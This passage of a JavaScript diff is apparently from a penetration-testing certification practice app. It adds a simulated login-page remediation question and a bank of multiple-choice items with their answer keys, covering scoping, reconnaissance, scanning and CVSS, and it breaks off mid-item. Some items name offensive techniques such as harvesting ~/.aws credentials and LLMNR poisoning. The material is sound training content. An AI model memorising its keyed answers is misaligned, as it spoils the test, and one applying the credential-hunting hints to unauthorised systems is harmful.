+    q.part2.commands.forEach((c, i) => {
+      const open = st.open === i;
+      const b = el("button", "rcmd" + (open ? " active" : ""), c.cmd); b.type = "button";
+      b.setAttribute("aria-expanded", open);
+      b.addEventListener("click", () => { st.open = open ? null : i; renderPart(); });
+      cmds.appendChild(b);
+      if (open) cmds.appendChild(el("pre", "rout", c.out));
+    });
+    p.appendChild(cmds);
+    p.appendChild(el("div", "rnote2", "Click a command to view its output."));
+    partWrap.appendChild(p);
+    const grid = el("div", "rgrid");
+    grid.appendChild(choiceBox(q.part2.escPrompt, q.part2.escOptions, false, "esc",
+      o => st.esc === o, o => o === q.part2.escAnswer, o => { st.esc = o; }, mono));
+    grid.appendChild(choiceBox(q.part2.remPrompt, q.part2.remOptions, true, "rem",
+      o => st.rem.includes(o), o => q.part2.remAnswers.includes(o),
+      (o, list) => { st.rem = [...list.querySelectorAll("input:checked")].map(x => x.value); },
+      (span, o) => { span.innerHTML = o.replace(/(no_root_squash|\bfstab\b|\/etc\/passwd|\bcp\b)/g, "<code>$1</code>"); }));
+    partWrap.appendChild(grid);
   }
 
   function clearFeedback() {
@@ -1506,6 +1727,164 @@ function bodyRecon(q, st, stage) {
     doSubmit();
   }
 
+  function doReset() { states[current] = freshState(q); renderQuestion(); }
+}
+
+/* ============================================================
+   TYPE: websim (Q7) — browser with view and remediate screens
+============================================================ */
+function bodyWebsim(q, st, stage) {
+  const sec = el("div", "section web-q");
+  sectionHead(sec, q.title, "Review the three components, then remediate only the highest vulnerability.");
+  const win = el("div", "bwin");
+  win.innerHTML = '<div class="btop"><span class="bdots"><i></i><i></i><i></i></span><span class="btab">Secure System</span></div>' +
+    '<div class="bnav"><button type="button" class="bback" aria-label="Back to the login page">←</button><span class="bfwd">→</span><span class="bfwd">↻</span><span class="burl"></span><span class="bfwd">⋮</span></div><div class="bpage"></div>';
+  sec.appendChild(win);
+  const page = win.querySelector(".bpage"), url = win.querySelector(".burl"), back = win.querySelector(".bback");
+  back.addEventListener("click", () => go("home"));
+
+  const { row: actionsRow, pill } = buildActions(doSubmit, doShow, doReset);
+  actionsRow.querySelectorAll("button")[2].textContent = "Reset All";
+  sec.appendChild(actionsRow);
+  const analysisBox = buildAnalysis(q.explain);
+  sec.appendChild(analysisBox);
+  stage.appendChild(sec);
+  render();
+
+  function go(v) { st.view = v; render(); win.scrollIntoView({ block: "nearest" }); }
+
+  function btn(cls, text, onClick) { const b = el("button", cls, text); b.type = "button"; b.addEventListener("click", onClick); return b; }
+
+  function certificate() {
+    const c = el("div", "cwin");
+    c.innerHTML = '<div class="ctitle">Certificate</div><div class="cbody"><div class="ctabs"><span class="on">General</span><span>Details</span><span>Certificate Path</span></div><div class="cpane"><div class="cinfo">' +
+      '<div class="chead"><svg viewBox="0 0 40 38" width="40" height="38" aria-hidden="true"><rect x="2" y="2" width="36" height="26" fill="#fdeec2" stroke="#222" stroke-width="2"/><path d="M8 9h18M8 15h12M8 21h10" stroke="#222" stroke-width="2.5"/><path d="M26 27l-3 10 5-3 5 3-3-10z" fill="#b8323c"/><circle cx="28" cy="23" r="6" fill="#e8862e" stroke="#222" stroke-width="1.5"/></svg><b>Certificate Information</b></div>' +
+      '<b>This certificate is identified for the following purpose(s):</b><ul><li>Ensures the identity of a remote computer</li></ul><div class="cref">*Refer to the certification authority’s statement for details.</div>' +
+      '<p><b>Issued to:</b> *.company.org</p><p><b>Issued by:</b> RapidSSL SHA256 CA</p><p><b>Valid from:</b> 7/18/2016 to 7/19/2018</p></div>' +
+      '<div class="cbtns"><span>Install Certificate...</span><span>Issuer Statement</span></div><div class="clearn">Learn more about <u>certificates</u></div></div><div class="cok">OK</div></div>';
+    return c;
+  }
+
+  function sourceList(pick) {
+    const list = el("div", "slist" + (pick ? " pick" : ""));
+    q.source.forEach((t, i) => {
+      const line = el(pick ? "label" : "div", "sline");
+      if (pick) {
+        line.appendChild(el("span", "sn", String(i + 1)));
+        const c = document.createElement("input"); c.type = "checkbox"; c.checked = st.src.includes(i);
+        c.addEventListener("change", () => { st.src = c.checked ? st.src.concat(i) : st.src.filter(x => x !== i); clearFeedback(); });
+        line.appendChild(c);
+      }
+      line.appendChild(el("code", null, t));
+      list.appendChild(line);
+    });
+    return list;
+  }
+
+  function place(opt, slot) {
+    const from = st.steps.indexOf(opt);
+    if (slot === null) { if (from > -1) st.steps[from] = ""; }
+    else { const old = st.steps[slot]; if (from > -1) st.steps[from] = old; st.steps[slot] = opt; }
+    clearFeedback();
+  }
+  function draggable(node, opt) {
+    node.draggable = true;
+    node.addEventListener("dragstart", e => { e.dataTransfer.setData("text/plain", opt); e.dataTransfer.effectAllowed = "move"; });
+  }
+  function dropZone(node, slot) {
+    node.addEventListener("dragover", e => { e.preventDefault(); node.classList.add("over"); });
+    node.addEventListener("dragleave", () => node.classList.remove("over"));
+    node.addEventListener("drop", e => { e.preventDefault(); const o = e.dataTransfer.getData("text/plain"); if (q.certOptions.includes(o)) place(o, slot); });
+  }
+  function dragDrop() {
+    const wrap = el("div", "ddwrap");
+    const pool = el("div", "ddpool"); pool.appendChild(el("div", "ddhead", "Drag and Drop Options"));
+    q.certOptions.filter(o => !st.steps.includes(o)).forEach(o => {
+      const b = btn("ddopt", o, () => { const free = st.steps.indexOf(""); if (free > -1) place(o, free); });
+      draggable(b, o); pool.appendChild(b);
+    });
+    dropZone(pool, null);
+    wrap.appendChild(pool);
+    wrap.appendChild(el("div", "ddhint", "Drag an option to a step, or tap it to fill the next empty step. Tap a filled step to remove it."));
+    st.steps.forEach((v, i) => {
+      wrap.appendChild(el("div", "ddlabel", "Step " + (i + 1)));
+      const slot = el("div", "ddslot");
+      if (v) {
+        const b = btn("ddopt", v, () => place(v, null)); draggable(b, v); slot.appendChild(b);
+        if (st.checked) { const ok = v === q.certAnswer[i]; slot.classList.add(ok ? "correct" : "wrong"); slot.appendChild(el("span", "ddmark", ok ? "Correct" : "Incorrect")); }
+      } else slot.appendChild(el("span", "ddq", "?"));
+      dropZone(slot, i);
+      wrap.appendChild(slot);
+    });
+    return wrap;
+  }
+
+  function render() {
+    page.innerHTML = "";
+    page.className = "bpage v-" + st.view;
+    url.textContent = "https://company.org/login.aspx" + (st.view === "home" ? "" : "#" + st.view);
+    back.disabled = st.view === "home";
+    if (st.checked && (st.src.length || st.ck.length)) page.appendChild(el("div", "bwarn", "You also changed the source or cookies. Only the highest vulnerability should be remediated (minus 1 point)."));
+    if (st.view === "home") {
+      const home = el("div", "bhome");
+      home.innerHTML = '<div class="htitle">Secure System</div><div class="hfield">User name</div><div class="hfield">Password</div><div class="hlogin">Login</div>';
+      const box = el("div", "hbox");
+      [["viewcert", "View certificate"], ["viewsource", "View Source"], ["viewcookies", "View Cookies"],
+       ["remediatecert", "Remediate Certificate"], ["remediatesource", "Remediate Source"], ["remediatecookies", "Remediate Cookies"]]
+        .forEach(([v, t]) => box.appendChild(btn(v.startsWith("view") ? "hview" : "hfix", t, () => go(v))));
+      home.appendChild(box); page.appendChild(home);
+    } else if (st.view === "viewcert") page.appendChild(certificate());
+    else if (st.view === "viewsource") page.appendChild(sourceList(false));
+    else if (st.view === "remediatesource") page.appendChild(sourceList(true));
+    else if (st.view === "viewcookies") page.appendChild(cookieTable(false));
+    else if (st.view === "remediatecert") {
+      const g = el("div", "certgrid"); g.append(certificate(), dragDrop()); page.appendChild(g);
+    } else page.appendChild(cookieTable(true));
+  }
+
+  function cookieTable(pick) {
+    const cols = ["Name", "Value", "Domain", "Path", "Expires/Max-Age", "Size", "HTTP", "Secure", "SameSite"];
+    const wrap = el("div", "ckwrap"), t = el("table", "cktable" + (pick ? " pick" : ""));
+    const head = el("tr", "ckhead"); cols.forEach(h => head.appendChild(el("th", null, h))); t.appendChild(head);
+    q.cookies.forEach((r, i) => {
+      const tr = el("tr");
+      r.forEach((v, c) => { const td = el("td", null, v); td.dataset.label = cols[c]; tr.appendChild(td); });
+      cols.slice(6).forEach(col => {
+        const td = el("td", "ckbox"); td.dataset.label = col;
+        if (pick) {
+          const key = i + ":" + col, lab = el("label"), c = document.createElement("input");
+          c.type = "checkbox"; c.checked = st.ck.includes(key);
+          c.setAttribute("aria-label", (col === "SameSite" ? "delete " : col + " flag for ") + r[0]);
+          c.addEventListener("change", () => { st.ck = c.checked ? st.ck.concat(key) : st.ck.filter(x => x !== key); clearFeedback(); });
+          lab.appendChild(c); if (col === "SameSite") lab.appendChild(el("span", null, "delete"));
+          td.appendChild(lab);
+        }
+        tr.appendChild(td);
+      });
+      t.appendChild(tr);
+    });
+    wrap.appendChild(t); return wrap;
+  }
+
+  function clearFeedback() {
+    st.checked = false;
+    pill.classList.remove("show", "full", "partial");
+    analysisBox.classList.remove("show");
+    const scroller = () => page.querySelector(".slist, .ckwrap");
+    const before = scroller(), y = before ? before.scrollTop : 0, x = before ? before.scrollLeft : 0, outer = $("examScroll").scrollTop;
+    render();
+    const after = scroller(); if (after) { after.scrollTop = y; after.scrollLeft = x; }
+    $("examScroll").scrollTop = outer;
+  }
+  function doSubmit() {
+    st.checked = true;
+    if (!st.view.startsWith("remediate")) st.view = "remediatecert";
+    render();
+    const g = gradeQuestion(q, st);
+    setPill(pill, g.pts, g.max);
+    analysisBox.classList.add("show");
+  }
+  function doShow() { st.steps = q.certAnswer.slice(); st.src = []; st.ck = []; st.view = "remediatecert"; doSubmit(); }
   function doReset() { states[current] = freshState(q); renderQuestion(); }
 }
 
@@ -1567,7 +1946,8 @@ function freshState(q) {
   if (q.type === "multi") return { tab: 0, ans: {}, checked: false };
   if (q.type === "sim") return { open: null, tab: "vuln", ans: { vuln: "", rem: [] }, checked: false };
   if (q.type === "hotspot") return { sel: [], tool: "", checked: false };
-  if (q.type === "recon2") return { tab: 0, p1: "", esc: "", rem: [], checked: false };
+  if (q.type === "recon2") return { tab: 0, open: null, p1: "", esc: "", rem: [], checked: false };
+  if (q.type === "websim") return { view: "home", steps: ["", "", "", ""], src: [], ck: [], checked: false };
   return { checked: false };
 }
 const MCQS = [{"domain": "Engagement Management", "topic": "Scope boundaries", "stem": "A signed engagement authorizes testing of <code>10.0.0.0/24</code> only. While scanning, the tester finds an exposed, clearly vulnerable host at <code>10.0.1.5</code>, outside that range. What is the most appropriate action?", "options": ["Exploit it immediately since it belongs to the same client", "Stop, document it, and get written authorization before testing that host", "Add it to the report as 'compromised' without testing", "Test it quietly and only mention it if the exploit works"], "answer": 1, "explain": "Anything outside the authorized scope must not be touched without explicit written approval; the tester pauses and has scope formally expanded first. <span class=\"mcq-ref\"><strong>Reference:</strong> NIST SP 800-115 §3; CompTIA PT0-003 Engagement Management</span>"}, {"domain": "Engagement Management", "topic": "Authorization letter", "stem": "On-site, building security questions why the tester is probing systems. Which document proves legal permission to test?", "options": ["The non-disclosure agreement (NDA)", "The signed authorization / permission-to-test letter", "The master service agreement (MSA)", "The scanner license"], "answer": 1, "explain": "The authorization ('get-out-of-jail') letter names in-scope systems and grants written permission; an NDA covers confidentiality and an MSA the business relationship. <span class=\"mcq-ref\"><strong>Reference:</strong> NIST SP 800-115 §3.3; CompTIA PT0-003 Engagement Management</span>"}, {"domain": "Engagement Management", "topic": "Rules of engagement", "stem": "A client requires testing only between 1:00 and 5:00 a.m. to avoid disruption. Where is this timing constraint recorded?", "options": ["In the rules of engagement", "In the CVSS vector", "In the executive summary", "In the proof of concept"], "answer": 0, "explain": "The rules of engagement capture timing windows, allowed techniques, emergency contacts, and other operational limits agreed before testing. <span class=\"mcq-ref\"><strong>Reference:</strong> CompTIA PT0-003 Engagement Management; PTES Pre-engagement</span>"}, {"domain": "Engagement Management", "topic": "Report audience", "stem": "Which report section is written for leadership and conveys business risk without deep technical detail?", "options": ["Executive summary", "Methodology", "Technical findings", "Raw tool-output appendix"], "answer": 0, "explain": "The executive summary frames risk in business terms for decision-makers; technical findings and raw output serve the remediation teams. <span class=\"mcq-ref\"><strong>Reference:</strong> NIST SP 800-115 §5; CompTIA PT0-003 Engagement Management</span>"}, {"domain": "Engagement Management", "topic": "CVSS base score", "stem": "A finding is scored CVSS v3.1 base 9.8. What does the base score represent?", "options": ["The intrinsic severity, independent of time or environment", "The chance the client patches it this quarter", "The dollar cost of remediation", "The score after the client's compensating controls"], "answer": 0, "explain": "Base metrics describe constant characteristics; temporal and environmental groups adjust for exploit maturity and the specific deployment. <span class=\"mcq-ref\"><strong>Reference:</strong> FIRST CVSS v3.1 Specification; CompTIA PT0-003 Vulnerability Analysis</span>"}, {"domain": "Engagement Management", "topic": "De-confliction", "stem": "Mid-engagement the tester finds artifacts suggesting a real, prior breach by an unrelated attacker. What is the first action?", "options": ["Keep testing and note it later", "Immediately notify the client via the agreed communication path", "Remove the other attacker's tools", "Shut the affected server down"], "answer": 1, "explain": "Evidence of a prior or active breach is a defined communication trigger; escalate to the client contact rather than altering evidence. <span class=\"mcq-ref\"><strong>Reference:</strong> NIST SP 800-115 §3.4; CompTIA PT0-003 Engagement Management</span>"}, {"domain": "Engagement Management", "topic": "EPSS vs CVSS", "stem": "To prioritize which flaw is most likely to be attacked in the wild, which pairing points to the highest-priority target?", "options": ["High CVSS, very low EPSS", "High EPSS and high CVSS together", "Low CVSS, low EPSS", "CVSS alone, ignoring EPSS"], "answer": 1, "explain": "CVSS rates severity while EPSS estimates real-world exploitation likelihood; a flaw high in both is the strongest candidate for urgent attention. <span class=\"mcq-ref\"><strong>Reference:</strong> FIRST EPSS model; CompTIA PT0-003 Vulnerability Analysis</span>"}, {"domain": "Engagement Management", "topic": "Remediation prioritization", "stem": "Which report component most directly helps the client decide what to fix first?", "options": ["Proof of concept", "Risk scoring of findings", "Attack narrative", "Tool version list"], "answer": 1, "explain": "Risk scoring combines severity, exploitability, and business impact so teams can rank remediation work. <span class=\"mcq-ref\"><strong>Reference:</strong> NIST SP 800-30 risk model; CompTIA PT0-003 Engagement Management</span>"}, {"domain": "Engagement Management", "topic": "Reproducibility", "stem": "Why include clear, step-by-step attack steps in a finding?", "options": ["To prove the tester's skill", "So defenders and auditors can independently verify and reproduce it", "To lengthen the report", "To justify the invoice"], "answer": 1, "explain": "Reproducible steps let the client confirm the finding and validate the fix; they are evidence, not showmanship. <span class=\"mcq-ref\"><strong>Reference:</strong> PTES Reporting; CompTIA PT0-003 Engagement Management</span>"}, {"domain": "Engagement Management", "topic": "Stakeholder alignment", "stem": "Which practice most reduces the chance the client rejects the final deliverable?", "options": ["Running more scans", "Aligning on scope, evidence, and report format with stakeholders up front", "Using more tools", "Skipping the executive summary"], "answer": 1, "explain": "Early agreement on scope, rules, evidence, and format ensures the report meets expectations and avoids rework. <span class=\"mcq-ref\"><strong>Reference:</strong> PTES Pre-engagement; CompTIA PT0-003 Engagement Management</span>"}, {"domain": "Engagement Management", "topic": "Goal reprioritization", "stem": "Which event would most likely make a client reprioritize goals after testing starts?", "options": ["A decommissioned end-of-life server", "A newly disclosed, actively exploited zero-day affecting their stack", "A new junior tester joining", "A change in report font"], "answer": 1, "explain": "A relevant, actively exploited zero-day creates urgent risk that can shift testing priorities mid-engagement. <span class=\"mcq-ref\"><strong>Reference:</strong> CompTIA PT0-003 Engagement Management</span>"}, {"domain": "Engagement Management", "topic": "Handling client data", "stem": "At engagement close, what best protects client confidentiality regarding collected artifacts?", "options": ["Keep everything for future reference", "Securely destroy or remove engagement data and captures from testing systems", "Email artifacts to the whole team", "Post sanitized data publicly"], "answer": 1, "explain": "Securely wiping captures, credentials, and artifacts from testing systems protects client confidentiality after the engagement. <span class=\"mcq-ref\"><strong>Reference:</strong> NIST SP 800-115 §3.5; CompTIA PT0-003 Engagement Management</span>"}, {"domain": "Reconnaissance & Enumeration", "topic": "Passive recon", "stem": "Which activity is purely passive reconnaissance?", "options": ["A full TCP connect scan", "Reviewing public WHOIS and DNS records", "Fingerprinting the OS with crafted packets", "Attempting a DNS zone transfer"], "answer": 1, "explain": "Passive recon gathers information without sending traffic to the target; WHOIS and public records qualify, while scans and AXFR attempts are active. <span class=\"mcq-ref\"><strong>Reference:</strong> NIST SP 800-115 §4.1; CompTIA PT0-003 Reconnaissance</span>"}, {"domain": "Reconnaissance & Enumeration", "topic": "Nmap version detection", "stem": "Which Nmap option identifies the application and version on each open port?", "options": ["-sV", "-sn", "-Pn", "-oN"], "answer": 0, "explain": "-sV enables service/version detection; -sn is host discovery, -Pn skips discovery, and -oN writes normal output. <span class=\"mcq-ref\"><strong>Reference:</strong> Nmap Reference Guide (nmap.org/book); CompTIA PT0-003 Reconnaissance</span>"}, {"domain": "Reconnaissance & Enumeration", "topic": "Host discovery", "stem": "What does <code>nmap -sn 192.168.1.0/24</code> do?", "options": ["A ping sweep listing live hosts, no port scan", "Scan all 65,535 ports on every host", "Run default NSE scripts", "Fingerprint the OS"], "answer": 0, "explain": "-sn disables port scanning and performs host discovery only, producing a list of responsive hosts. <span class=\"mcq-ref\"><strong>Reference:</strong> Nmap Reference Guide; CompTIA PT0-003 Reconnaissance</span>"}, {"domain": "Reconnaissance & Enumeration", "topic": "SMB enumeration", "stem": "Which tool best enumerates shares, users, and groups over SMB from a Windows/Samba host?", "options": ["enum4linux", "sqlmap", "aircrack-ng", "hydra"], "answer": 0, "explain": "enum4linux wraps Samba tooling to enumerate shares, users, groups, and policies; the others target SQLi, Wi-Fi, and login brute forcing. <span class=\"mcq-ref\"><strong>Reference:</strong> enum4linux documentation; CompTIA PT0-003 Reconnaissance</span>"}, {"domain": "Reconnaissance & Enumeration", "topic": "OSINT tooling", "stem": "theHarvester is primarily used to do what?", "options": ["Collect emails, subdomains, and hosts from public sources", "Crack password hashes", "Exploit SMB signing", "Generate payloads"], "answer": 0, "explain": "theHarvester aggregates OSINT such as emails, subdomains, and host names from public datasets to profile a target. <span class=\"mcq-ref\"><strong>Reference:</strong> theHarvester docs; CompTIA PT0-003 Reconnaissance</span>"}, {"domain": "Reconnaissance & Enumeration", "topic": "Zone transfer", "stem": "A successful DNS zone transfer (AXFR) against a misconfigured server yields what?", "options": ["A full copy of the zone's DNS records", "A shell on the server", "The server's shadow file", "A cracked admin password"], "answer": 0, "explain": "An open AXFR hands over every record in the zone, exposing internal host names and addresses useful for mapping. <span class=\"mcq-ref\"><strong>Reference:</strong> RFC 1035; CompTIA PT0-003 Reconnaissance</span>"}, {"domain": "Reconnaissance & Enumeration", "topic": "Nmap default scripts", "stem": "What does the <code>-sC</code> flag add?", "options": ["Runs the default set of NSE scripts", "Enables a SYN half-open scan", "Sets the most aggressive timing", "Scans only the top 100 ports"], "answer": 0, "explain": "-sC is equivalent to --script=default and runs the safe default NSE scripts for extra detail. <span class=\"mcq-ref\"><strong>Reference:</strong> Nmap Reference Guide (NSE); CompTIA PT0-003 Reconnaissance</span>"}, {"domain": "Reconnaissance & Enumeration", "topic": "Search-engine OSINT", "stem": "Using <code>site:example.com filetype:pdf</code> in a search engine is best described as:", "options": ["Google dorking (OSINT)", "A denial-of-service attack", "SQL injection", "ARP spoofing"], "answer": 0, "explain": "Advanced search operators that surface exposed files and content are 'Google dorking', a passive OSINT technique. <span class=\"mcq-ref\"><strong>Reference:</strong> OWASP WSTG-INFO-01; CompTIA PT0-003 Reconnaissance</span>"}, {"domain": "Reconnaissance & Enumeration", "topic": "Search operator", "stem": "Which operator best finds email addresses within the body text of indexed pages?", "options": ["site:", "intitle:", "intext:", "inurl:"], "answer": 2, "explain": "intext: searches page body content, useful for locating email strings; the others scope by site, title, or URL. <span class=\"mcq-ref\"><strong>Reference:</strong> OWASP WSTG-INFO; CompTIA PT0-003 Reconnaissance</span>"}, {"domain": "Reconnaissance & Enumeration", "topic": "Domain user enumeration", "stem": "From an authenticated Windows foothold, which built-in tool lists all domain users?", "options": ["pwd.exe", "net.exe (e.g., net user /domain)", "sc.exe", "msconfig.exe"], "answer": 1, "explain": "net.exe enumerates domain accounts from an authenticated context without extra tooling. <span class=\"mcq-ref\"><strong>Reference:</strong> Microsoft net command docs; CompTIA PT0-003 Reconnaissance</span>"}, {"domain": "Reconnaissance & Enumeration", "topic": "UDP scan state", "stem": "An <code>nmap -sU</code> scan marks UDP 161 as <code>open|filtered</code>, yet snmpwalk gets valid replies. Why the scan state?", "options": ["SNMP is actually down", "No reply (response or ICMP unreachable) arrived within the scan window, so Nmap cannot distinguish open from filtered", "The host rate-limited only snmpwalk", "Nmap needs a second NIC"], "answer": 1, "explain": "With no UDP reply and no ICMP port-unreachable, Nmap cannot tell open from filtered and labels the port open|filtered. <span class=\"mcq-ref\"><strong>Reference:</strong> Nmap Reference Guide (UDP scan); CompTIA PT0-003 Reconnaissance</span>"}, {"domain": "Reconnaissance & Enumeration", "topic": "Service role ID", "stem": "Open TCP 53, 88, 389, and 445 plus an AD domain name most likely indicate which role?", "options": ["Enterprise mail server", "Honeypot", "Stand-alone web server", "Active Directory Domain Controller"], "answer": 3, "explain": "DNS (53), Kerberos (88), LDAP (389), and SMB (445) with a domain name are hallmark Domain Controller services. <span class=\"mcq-ref\"><strong>Reference:</strong> Microsoft AD port reference; CompTIA PT0-003 Reconnaissance</span>"}, {"domain": "Reconnaissance & Enumeration", "topic": "TLS cipher enumeration", "stem": "Which tool best automates enumerating permitted TLS ciphers across many servers?", "options": ["Nmap Scripting Engine (ssl-enum-ciphers)", "Shodan", "Impacket", "Netcat"], "answer": 0, "explain": "NSE's ssl-enum-ciphers runs consistently across host lists to enumerate supported TLS/SSL ciphers. <span class=\"mcq-ref\"><strong>Reference:</strong> Nmap NSE ssl-enum-ciphers; CompTIA PT0-003 Reconnaissance</span>"}, {"domain": "Reconnaissance & Enumeration", "topic": "Container scanning", "stem": "Which tool best scans container images and Kubernetes configs for vulnerabilities and misconfigurations?", "options": ["NSE", "Nessus", "CrackMapExec", "Trivy"], "answer": 3, "explain": "Trivy scans images, OS and app dependencies, and container/Kubernetes misconfigurations. <span class=\"mcq-ref\"><strong>Reference:</strong> Trivy documentation; CompTIA PT0-003 Reconnaissance</span>"}, {"domain": "Reconnaissance & Enumeration", "topic": "AD password policy", "stem": "With valid domain credentials, which tool retrieves the AD password policy to build a policy-aware wordlist?", "options": ["Responder", "CrackMapExec", "Hydra", "msfvenom"], "answer": 1, "explain": "CrackMapExec queries authenticated SMB/LDAP to retrieve password and lockout policy. <span class=\"mcq-ref\"><strong>Reference:</strong> CrackMapExec docs; CompTIA PT0-003 Reconnaissance</span>"}, {"domain": "Reconnaissance & Enumeration", "topic": "Low-noise discovery", "stem": "To identify live hosts on a segment while minimizing IPS alerts, which action is quietest?", "options": ["Reverse DNS (PTR) lookups that blend with normal DNS traffic", "A full ICMP ping sweep", "LLMNR poisoning", "An aggressive SYN scan of all hosts"], "answer": 0, "explain": "Reverse DNS lookups resemble ordinary DNS traffic and are quieter than active sweeps or poisoning. <span class=\"mcq-ref\"><strong>Reference:</strong> NIST SP 800-115 §4; CompTIA PT0-003 Reconnaissance</span>"}, {"domain": "Reconnaissance & Enumeration", "topic": "OT discovery safety", "stem": "In a fragile OT/ICS segment where active probing is prohibited, how should the tester discover systems?", "options": ["Aggressively scan every device", "Perform passive network capture for a set period", "Install agents on the PLCs", "Fuzz the controllers"], "answer": 1, "explain": "Passive capture observes traffic without active probes that could disrupt sensitive OT devices. <span class=\"mcq-ref\"><strong>Reference:</strong> NIST SP 800-82 (ICS security); CompTIA PT0-003 Reconnaissance</span>"}, {"domain": "Reconnaissance & Enumeration", "topic": "ICS traffic inspection", "stem": "A vendor-supported ICS host must not be modified. How can the tester check whether its traffic is encrypted in transit?", "options": ["Install a packet sniffer on the host", "Use switch port mirroring (SPAN) to an external analyzer", "Reconfigure the app to use a proxy", "Disable certificate pinning"], "answer": 1, "explain": "Port mirroring copies traffic to a monitoring port so an external analyzer inspects it without touching the ICS host. <span class=\"mcq-ref\"><strong>Reference:</strong> NIST SP 800-82; CompTIA PT0-003 Reconnaissance</span>"}, {"domain": "Reconnaissance & Enumeration", "topic": "Cloud credential discovery", "stem": "On a compromised workstation, which home-directory artifact most directly exposes cloud control-plane access?", "options": ["~/Documents", "~/.bash_history", "~/.aws (CLI credentials/profiles)", "~/Desktop"], "answer": 2, "explain": "The .aws directory commonly stores access keys and profiles granting cloud API access. <span class=\"mcq-ref\"><strong>Reference:</strong> AWS CLI configuration docs; CompTIA PT0-003 Reconnaissance</span>"}, {"domain": "Reconnaissance & Enumeration", "topic": "Credentialed scanning", "stem": "What is the main advantage of a credentialed vulnerability scan over an unauthenticated one?", "options": ["It is always faster", "It inspects patch levels from inside, giving more accurate results with fewer false positives", "It needs no client agreement", "It is undetectable"], "answer": 1, "explain": "Authenticated scans read installed-software and patch data directly, greatly improving accuracy. <span class=\"mcq-ref\"><strong>Reference:</strong> NIST SP 800-115 §4.3; CompTIA PT0-003 Vulnerability Analysis</span>"}, {"domain": "Vulnerability Discovery & Analysis", "topic": "False positive", "stem": "A scanner reports a TLS flaw on 443, but Nmap shows <code>443/tcp closed</code>. How is the report classified?", "options": ["True negative", "True positive", "False negative", "False positive"], "answer": 3, "explain": "No service is listening on 443, so a reported port-443 TLS flaw is a false positive that manual validation rules out. <span class=\"mcq-ref\"><strong>Reference:</strong> OWASP WSTG analysis; CompTIA PT0-003 Vulnerability Analysis</span>"}, {"domain": "Vulnerability Discovery & Analysis", "topic": "Banner analysis", "stem": "A service returns the banner <code>vsftpd 2.3.4</code>. What is the correct next analysis step?", "options": ["Research known CVEs for that exact version", "Reformat the server", "Assume it is secure", "Block the port"], "answer": 0, "explain": "A version banner maps the software to published CVEs so the tester can plan a validated path. <span class=\"mcq-ref\"><strong>Reference:</strong> CVE / NVD; CompTIA PT0-003 Vulnerability Analysis</span>"}, {"domain": "Vulnerability Discovery & Analysis", "topic": "Severity standard", "stem": "Which standard gives a vendor-neutral 0.0-10.0 severity score for a vulnerability?", "options": ["CVSS", "CVE", "OWASP", "MITRE ATT&CK"], "answer": 0, "explain": "CVSS produces the numeric severity; CVE is the identifier catalog, OWASP is web guidance, and ATT&CK is a technique taxonomy. <span class=\"mcq-ref\"><strong>Reference:</strong> FIRST CVSS v3.1; CompTIA PT0-003 Vulnerability Analysis</span>"}, {"domain": "Vulnerability Discovery & Analysis", "topic": "CVSS environmental", "stem": "What do CVSS environmental metrics let an organization do?", "options": ["Record exploit maturity over time", "Tailor the score to asset importance and local mitigations", "Describe intrinsic exploitability", "Set a patch deadline"], "answer": 1, "explain": "Environmental metrics adjust the score for asset criticality and compensating controls in a specific deployment. <span class=\"mcq-ref\"><strong>Reference:</strong> FIRST CVSS v3.1 Specification; CompTIA PT0-003 Vulnerability Analysis</span>"}, {"domain": "Vulnerability Discovery & Analysis", "topic": "Web scanner", "stem": "Which tool scans web servers for dangerous files, outdated software, and misconfigurations?", "options": ["Nikto", "Responder", "Netcat", "John the Ripper"], "answer": 0, "explain": "Nikto checks web servers for thousands of known issues; the others poison name resolution, move data, or crack hashes. <span class=\"mcq-ref\"><strong>Reference:</strong> Nikto documentation; CompTIA PT0-003 Vulnerability Analysis</span>"}, {"domain": "Vulnerability Discovery & Analysis", "topic": "Validation", "stem": "A scanner flags a critical flaw, but manual testing shows the feature is disabled and not exploitable. This is a:", "options": ["False positive", "False negative", "Zero-day", "True positive"], "answer": 0, "explain": "A reported issue that is not actually exploitable is a false positive; validating output by hand is core analysis work. <span class=\"mcq-ref\"><strong>Reference:</strong> NIST SP 800-115 §4; CompTIA PT0-003 Vulnerability Analysis</span>"}, {"domain": "Vulnerability Discovery & Analysis", "topic": "SAST vs DAST", "stem": "A finding flags unsafe deserialization from reading Python source without running the app. Which scan type produced it?", "options": ["DAST", "SAST", "IAST", "SCA"], "answer": 1, "explain": "SAST inspects source code and patterns without executing the application; DAST tests a running app and SCA checks dependencies. <span class=\"mcq-ref\"><strong>Reference:</strong> OWASP SAST/DAST guidance; CompTIA PT0-003 Vulnerability Analysis</span>"}, {"domain": "Vulnerability Discovery & Analysis", "topic": "SCA purpose", "stem": "Which analysis specifically flags known-vulnerable third-party libraries in a build?", "options": ["SAST", "DAST", "Software Composition Analysis (SCA)", "Fuzzing"], "answer": 2, "explain": "SCA inventories dependencies and matches them to known CVEs, catching vulnerable components. <span class=\"mcq-ref\"><strong>Reference:</strong> OWASP Dependency management; CompTIA PT0-003 Vulnerability Analysis</span>"}, {"domain": "Vulnerability Discovery & Analysis", "topic": "Java static analysis", "stem": "To statically analyze a compiled <code>.jar</code>, what must the tester do first?", "options": ["Decompile the bytecode to readable source", "Fuzz the archive", "Convert it to a .so", "Disassemble the JVM"], "answer": 0, "explain": "A jar holds compiled .class bytecode, so decompiling to source is the first step for static review. <span class=\"mcq-ref\"><strong>Reference:</strong> OWASP WSTG; CompTIA PT0-003 Vulnerability Analysis</span>"}, {"domain": "Vulnerability Discovery & Analysis", "topic": "Insecure error handling", "stem": "A SAST report flags <code>e.printStackTrace()</code> in a catch block. What is the best remediation?", "options": ["Delete the whole method", "Replace it with a controlled logging framework", "Mark it a false positive", "Catch a broader exception"], "answer": 1, "explain": "Routing errors through a logging framework with safe levels and storage prevents leaking internal details via stack traces. <span class=\"mcq-ref\"><strong>Reference:</strong> OWASP WSTG Error Handling; CompTIA PT0-003 Vulnerability Analysis</span>"}, {"domain": "Vulnerability Discovery & Analysis", "topic": "Scan result validation", "stem": "A vuln report lists an SSHv1 finding, but the banner shows OpenSSH 9.x with only protocol 2 enabled. The tester should:", "options": ["Report it as-is", "Validate against the live service and mark it a false positive", "Assume the scanner is always right", "Exploit it anyway"], "answer": 1, "explain": "Confirming findings against the live service prevents reporting issues the deployed configuration does not actually have. <span class=\"mcq-ref\"><strong>Reference:</strong> NIST SP 800-115 §4; CompTIA PT0-003 Vulnerability Analysis</span>"}, {"domain": "Vulnerability Discovery & Analysis", "topic": "Prioritization", "stem": "With limited time, what should most influence remediation order?", "options": ["Alphabetical host names", "Business risk: 